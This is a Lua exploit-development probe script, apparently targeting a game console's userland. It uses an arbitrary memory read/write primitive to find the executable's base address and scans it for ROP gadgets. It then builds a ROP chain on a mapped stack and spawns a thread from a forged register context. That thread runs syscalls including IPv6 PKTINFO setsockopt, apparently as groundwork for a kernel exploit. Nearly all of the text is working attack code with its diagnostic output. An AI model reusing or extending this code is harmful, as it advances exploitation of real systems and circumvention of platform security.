-- CRASH_CLASS: MODERATE
-- PROBE 91h: Child register dump — verify R10/R8 in thr_create context
--
-- 91g: child setsockopt(PKTINFO) does NOT change marker.
-- Hypothesis: R10 offset (0x090) may be wrong, or kernel clobbers it.
-- This: find mov [rdi],rax;ret gadget, child writes each register to
-- a shared buffer so we can see what values the child actually has.

print("=== PROBE 91h: CHILD REGISTER DUMP ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local ebase=uint64(string.format("0x%X%08X",ehi,elo))
local text_sz=rd(inf+0x110) or 0
if text_sz<0 then text_sz=text_sz+0x100000000 end
print("eboot="..string.format("0x%X%08X",ehi,elo).." sz="..string.format("0x%X",text_sz))

local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))

-- ============================================================
-- FIND mov [rdi],rax;ret (48 89 07 C3)
-- ============================================================
print("")
print("--- GADGET: mov [rdi],rax;ret ---")

local function read_byte(off)
    local aligned=off-off%4
    local v=rd(ebase+aligned)
    if not v then return nil end
    local shift=off%4
    if shift==0 then return v%256
    elseif shift==1 then return math.floor(v/256)%256
    elseif shift==2 then return math.floor(v/65536)%256
    else return math.floor(v/16777216)%256 end
end

local MOV_RDI_RAX=nil
local scan_lim=math.min(text_sz,0x500000)

for off=0,scan_lim-4,4 do
    local v=rd(ebase+off)
    if not v then break end
    local b0=v%256
    local b1=math.floor(v/256)%256
    local b2=math.floor(v/65536)%256
    local b3=math.floor(v/16777216)%256

    -- 48 89 07 C3 within dword
    if b0==0x48 and b1==0x89 and b2==0x07 and b3==0xC3 then
        MOV_RDI_RAX=off; break
    end
    -- across boundary: check if prev bytes + current form the pattern
    if off>0 then
        local pb1=read_byte(off-1)
        local pb2=read_byte(off-2)
        local pb3=read_byte(off-3)
        if pb1==0x07 and b0==0xC3 and pb2==0x89 and pb3==0x48 then
            MOV_RDI_RAX=off-3; break
        end
        if pb1==0x89 and b0==0x07 and b1==0xC3 and pb2==0x48 then
            MOV_RDI_RAX=off-2; break
        end
        if pb1==0x48 and b0==0x89 and b1==0x07 and b2==0xC3 then
            MOV_RDI_RAX=off-1; break
        end
    end
end

if MOV_RDI_RAX then
    print("found at +"..string.format("0x%X",MOV_RDI_RAX))
    local bytes=""
    for i=0,5 do
        local b=read_byte(MOV_RDI_RAX+i)
        if b then bytes=bytes..string.format("%02X ",b) else bytes=bytes.."?? " end
    end
    print("  bytes: "..bytes)
else
    -- Try mov [rdi],eax;ret (89 07 C3) - 32-bit write
    print("48 89 07 C3 not found, trying 89 07 C3...")
    for off=0,scan_lim-4,4 do
        local v=rd(ebase+off)
        if not v then break end
        local b0=v%256
        local b1=math.floor(v/256)%256
        local b2=math.floor(v/65536)%256
        if b0==0x89 and b1==0x07 and b2==0xC3 then
            MOV_RDI_RAX=off
            print("mov [rdi],eax;ret at +"..string.format("0x%X",off))
            break
        end
        if b1==0x89 and b2==0x07 then
            local b3=math.floor(v/16777216)%256
            if b3==0xC3 then
                MOV_RDI_RAX=off+1
                print("mov [rdi],eax;ret at +"..string.format("0x%X",off+1))
                break
            end
        end
    end
end

if not MOV_RDI_RAX then
    print("NO WRITE GADGET FOUND")
    print("canary="..N(native.fcall_with_rax(stub,20)))
    print("=== 91h DONE ===")
    return
end

local WMOV=uint64(string.format("0x%X%08X",ehi,elo+MOV_RDI_RAX))

-- ============================================================
-- TEST: Child writes registers to shared buffer
-- ============================================================
print("")
print("--- REGISTER DUMP ---")

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R8=0x068;local _R10=0x090;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

-- Shared buffer: child writes register values here
local shared=memory.alloc(128); z(shared,128)
-- sentinel
wq(shared,uint64(0xDEADDEAD))
wq(shared+8,uint64(0xDEADDEAD))
wq(shared+16,uint64(0xDEADDEAD))
wq(shared+24,uint64(0xDEADDEAD))
wq(shared+32,uint64(0xDEADDEAD))

-- Test values for registers
local TEST_DI=0x11111111
local TEST_SI=0x22222222
local TEST_DX=0x33333333
local TEST_AX=0x44444444
local TEST_R10=0x55555555
local TEST_R8=0x66666666

-- Child chain:
-- 1. Write RAX to [RDI] (shared+0) — initial RAX value
-- 2. Move to next slot, write different reg values
--
-- Strategy: child enters at WMOV with RDI=shared, RAX=TEST_AX
-- After mov [rdi],rax;ret: shared+0 = TEST_AX, RSP+=8
-- Next: PRDI, shared+8, WMOV — but we need a different value in RAX
--
-- Better: use getpid to put pid in RAX, then write it
-- Or: just write the initial RAX, then use the chain to set up
-- different test values

-- Child entry: RIP=WMOV, writes RAX to [RDI], then chain continues
-- After write: ret pops next gadget from stack

local STSZ=0x4000
local ok_s,stk=pcall(function()
    return mm(uint64(0),uint64(STSZ),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_s then print("FAIL mmap") return end

-- Chain: write test values to shared buffer slots
-- Slot 0: initial RAX (written by entry WMOV)
-- Slot 1: write getpid result (proves syscall works)
-- Slot 2: write R10 test value
-- Slot 3: write R8 test value
-- Slot 4: setsockopt result

local off=0
-- After entry WMOV writes RAX=TEST_AX to shared+0...
-- Slot 1: getpid, write result
wq(stk+off,PRAX); off=off+8
wq(stk+off,uint64(20)); off=off+8  -- getpid
wq(stk+off,SA); off=off+8          -- syscall;ret → RAX=pid
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(N(shared)+8)); off=off+8
wq(stk+off,WMOV); off=off+8        -- shared+8 = pid

-- Slot 2: need to read R10 somehow.
-- Problem: no "mov rax,r10;ret" gadget. Can't read R10 directly.
-- Alternative: call setsockopt and write its return value.
-- If setsockopt returns -1, something is wrong with args.

-- Slot 2: try setsockopt, write result
-- First set up the setsockopt: need RDI=s6, RSI=41, RDX=46, R10=pi_c, R8=20
-- We can set RDI, RSI, RDX, RAX via gadgets. R10 and R8 are from initial context.

local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("IPv6 BLOCKED") return end

local PV6=41; local PKTINFO=46
local pi_c=memory.alloc(20); z(pi_c,20); wd(pi_c,2)

-- Set baseline=77
local p0=memory.alloc(20); z(p0,20); wd(p0,77)
native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(p0),20)

-- Chain: set RDI=s6, RSI=41, RDX=46, RAX=105, syscall, write result
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(s6)); off=off+8
wq(stk+off,PRSI); off=off+8
wq(stk+off,uint64(PV6)); off=off+8
wq(stk+off,PRDX); off=off+8
wq(stk+off,uint64(PKTINFO)); off=off+8
wq(stk+off,PRAX); off=off+8
wq(stk+off,uint64(105)); off=off+8  -- setsockopt
wq(stk+off,SA); off=off+8           -- syscall;ret → RAX=setsockopt result
-- Write result to shared+16
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(N(shared)+16)); off=off+8
wq(stk+off,WMOV); off=off+8         -- shared+16 = setsockopt return

-- Slot 3: check marker via getsockopt
local gb=memory.alloc(32); z(gb,32)
local gl=memory.alloc(4); wd(gl,20)
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(s6)); off=off+8
wq(stk+off,PRSI); off=off+8
wq(stk+off,uint64(PV6)); off=off+8
wq(stk+off,PRDX); off=off+8
wq(stk+off,uint64(PKTINFO)); off=off+8
-- R10=gb (getsockopt optval) — BUT R10 IS FROM INITIAL CONTEXT!
-- We can't set R10 in the chain without a pop r10 gadget!
-- So getsockopt will use whatever R10 has (pi_c from initial context)
-- That's WRONG for getsockopt. Skip getsockopt from child.

-- Instead: just nanosleep tail
-- Reset off back
off=off-6*8  -- undo the getsockopt attempt

-- Nanosleep tail
local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(N(ts))); off=off+8
wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
wq(stk+off,SA); off=off+8

print("chain built, "..math.floor(off/8).." qwords")

-- Spawn child
-- Entry: RIP=WMOV, RDI=shared, RAX=TEST_AX
-- Also set R10=pi_c, R8=20 (for setsockopt test later in chain)
local ctx=memory.alloc(0x200); z(ctx,0x200)
wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
wq(ctx+_TP,uint64(0x10000))
wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
wq(ctx+_IP,WMOV)          -- entry: mov [rdi],rax;ret
wq(ctx+_SP,uint64(N(stk)))
wq(ctx+_AX,uint64(TEST_AX))
wq(ctx+_DI,uint64(N(shared)))
wq(ctx+_SI,uint64(TEST_SI))
wq(ctx+_DX,uint64(TEST_DX))
wq(ctx+_R10,uint64(N(pi_c)))
wq(ctx+_R8,uint64(20))

local tb=memory.alloc(8); wq(tb,uint64(0))
local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
local tid=rq(tb)
print("thr_create rv="..(ok_t and tostring(N(rv_t)) or "X").." tid="..q(tid))

-- Wait 50ms
local sl=memory.alloc(16); wq(sl,uint64(0)); wq(sl+8,uint64(50000000))
native.fcall_with_rax(stub,240,N(sl),0)
print("child alive="..tostring(alive(tid)))

-- Read shared buffer
local v0=rq(shared)
local v1=rq(shared+8)
local v2=rq(shared+16)
print("")
print("shared+0  (initial RAX):   "..q(v0).." (expect "..string.format("0x%X",TEST_AX)..")")
print("shared+8  (getpid result): "..q(v1).." (expect pid="..pid..")")
print("shared+16 (setsockopt rv): "..q(v2).." (expect 0 or -1)")

-- Check PKTINFO marker
local gb2=memory.alloc(32); z(gb2,32)
local gl2=memory.alloc(4); wd(gl2,20)
native.fcall_with_rax(stub,118,s6,PV6,PKTINFO,N(gb2),N(gl2))
local mk=rd(gb2)
print("PKTINFO marker="..tostring(mk).." (77=unchanged, 2=child set it)")

-- Cleanup
native.fcall_with_rax(stub,6,s6)
if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
print("")
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91h DONE ===")
